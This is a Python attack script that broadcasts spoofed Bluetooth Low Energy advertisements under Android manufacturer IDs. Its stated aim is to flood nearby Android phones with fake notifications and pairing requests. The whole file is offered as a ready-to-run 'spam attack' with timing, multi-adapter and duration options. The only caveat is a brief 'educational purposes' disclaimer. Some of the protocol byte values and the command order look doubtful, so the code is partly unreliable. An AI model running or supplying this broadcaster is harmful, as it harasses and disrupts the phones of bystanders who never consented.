"""
Android Spam BLE Advertisement Broadcaster

This script broadcasts fake Android device BLE advertisements to nearby Android devices.
It exploits Android's proximity advertising by sending spoofed advertisement packets
that trigger notifications and pairing requests on Android devices.

This attack targets various Android device manufacturers and uses their manufacturer IDs
to craft convincing advertisements.

WARNING: This is for educational purposes only. Use responsibly and only on devices
you own or have permission to test.
"""

import random
import bluetooth._bluetooth as bluez
from time import sleep
import struct
import socket
import array
import fcntl
import os
import time
from errno import EALREADY
import threading


# ANSI Color codes
RED = "\033[31m"
GREEN = '\033[32m'
BLUE = '\033[34m'
CYAN = '\033[36m'
WHITE = '\033[37m'
YELLOW = '\033[33m'
RESET = "\033[0m"
BRIGHT = '\033[1m'


def decode_hex(string):
    """Decodes a hex string to bytes."""
    assert len(string) % 2 == 0, "String must have an even length"
    return bytes.fromhex(string)


def setup_device(device_id):
    """Setup the Bluetooth device for advertising."""
    try:
        hci_sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
        req_str = struct.pack("H", device_id)
        request = array.array("b", req_str)
        fcntl.ioctl(hci_sock.fileno(), bluez.HCIDEVUP, request[0])
    except IOError as e:
        if e.errno != EALREADY:
            raise
    finally:
        hci_sock.close()


def send_packet(sock, device_id):
    """
    Send Android device advertisement packet.
    
    Uses manufacturer IDs from various Android manufacturers:
    - Google: 0x00E0
    - Samsung: 0x0075
    - OnePlus: 0x02BE
    - Xiaomi: 0x038F
    - Huawei: 0x018B
    """
    
    # Android manufacturer IDs
    android_manufacturers = {
        "Google": 0x00E0,
        "Samsung": 0x0075,
        "OnePlus": 0x02BE,
        "Xiaomi": 0x038F,
        "Huawei": 0x018B,
    }
    
    # Device identifiers for Android devices
    android_devices = {
        "Pixel": decode_hex("0A"),
        "Galaxy": decode_hex("02"),
        "OneCard": decode_hex("04"),
        "Mi": decode_hex("06"),
        "Mate": decode_hex("08"),
    }
    
    # Select random manufacturer and device
    manufacturer_name = random.choice(list(android_manufacturers.keys()))
    manufacturer_id = android_manufacturers[manufacturer_name]
    device_type = random.choice(list(android_devices.keys()))
    device_bytes = android_devices[device_type]
    
    print(f'{YELLOW}Broadcasting: {manufacturer_name} {device_type}{RESET}')
    
    # Build manufacturer-specific advertisement data
    prepended_bytes = decode_hex("010002000101FF000001")
    manufacturer_specific_data = struct.pack('<H', manufacturer_id) + prepended_bytes + device_bytes
    
    # Build BLE advertisement packet
    ad_type_flags = bytes([0x02, 0x01, 0x06])  # Flags: LE General Discoverable Mode
    manufacturer_data_length = len(manufacturer_specific_data) + 1
    bt_packet = ad_type_flags + bytes([manufacturer_data_length, 0xFF]) + manufacturer_specific_data
    
    # Advertising parameters
    min_interval = 0x20  # 20ms
    max_interval = 0x40  # 40ms
    adv_type = 0x00      # Non-connectable undirected advertising
    own_addr_type = 0x00  # Public Device Address
    peer_addr_type = 0x00
    peer_addr = [0x00] * 6
    chan_map = 0x07      # All channels
    filter_policy = 0x00
    
    # Send advertising parameters
    cmd_pkt = struct.pack("<HHBBB6BBB", min_interval, max_interval, adv_type, 
                         own_addr_type, peer_addr_type, *peer_addr, chan_map, filter_policy)
    bluez.hci_send_cmd(sock, 0x08, 0x0006, cmd_pkt)  # Set advertising parameters
    time.sleep(0.03)
    
    # Enable advertising
    cmd_pkt = struct.pack("<B", 0x01)
    bluez.hci_send_cmd(sock, 0x08, 0x000A, cmd_pkt)  # Enable advertising
    time.sleep(0.03)
    
    # Set advertising data
    cmd_pkt = struct.pack("<B%dB" % len(bt_packet), len(bt_packet), *bt_packet)
    bluez.hci_send_cmd(sock, 0x08, 0x0008, cmd_pkt)  # Set advertising data
    time.sleep(0.03)


def android_spam(device_ids, duration=60, interval=1):
    """
    Main Android spam attack function.
    
    Args:
        device_ids (list): List of HCI device identifiers (e.g., ["hci0", "hci1"])
        duration (int): Duration of the attack in seconds
        interval (int): Interval between packets in seconds
    """
    
    print(f"{GREEN}{BRIGHT}Android Spam Attack Initiated...{RESET}{BLUE}")
    
    sockets = []
    threads = []
    
    try:
        # Setup all Bluetooth devices
        for device_id in device_ids:
            hci_id = int(device_id.replace("hci", ""))
            print(f"Setting up {device_id}...")
            setup_device(hci_id)
            try:
                sock = bluez.hci_open_dev(hci_id)
                sockets.append((device_id, sock))
            except Exception as e:
                print(f"{RED}Unable to connect to Bluetooth hardware {device_id}: {e}{RESET}")
        
        if not sockets:
            print(f"{RED}No Bluetooth devices available!{RESET}")
            return
        
        print(f"{GREEN}Hold on tight, we are flying far away!{RESET}")
        print(f"{CYAN}Broadcasting Android advertisements...{RESET}")
        print(f"{YELLOW}Duration: {duration} seconds{RESET}\n")
        
        start_time = time.time()
        packet_count = 0
        
        # Send packets for specified duration
        while time.time() - start_time < duration:
            for device_label, sock in sockets:
                try:
                    send_packet(sock, int(device_label.replace("hci", "")))
                    packet_count += 1
                except Exception as e:
                    print(f"{RED}Error sending packet on {device_label}: {e}{RESET}")
            
            time.sleep(interval)
        
        print(f"\n{GREEN}Attack completed!{RESET}")
        print(f"{CYAN}Packets sent: {packet_count}{RESET}")
        
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Attack interrupted by user{RESET}")
    except Exception as e:
        print(f"{RED}An error occurred: {e}{RESET}")
    finally:
        # Close all sockets
        for device_label, sock in sockets:
            try:
                sock.close()
            except:
                pass
        
        print(f"{BLUE}Cleaned up resources.{RESET}")


if __name__ == "__main__":
    # For testing: run with default parameters
    import sys
    devices = ["hci0"]
    if len(sys.argv) > 1:
        devices = sys.argv[1:]
    
    android_spam(device_ids=devices, duration=60, interval=1)
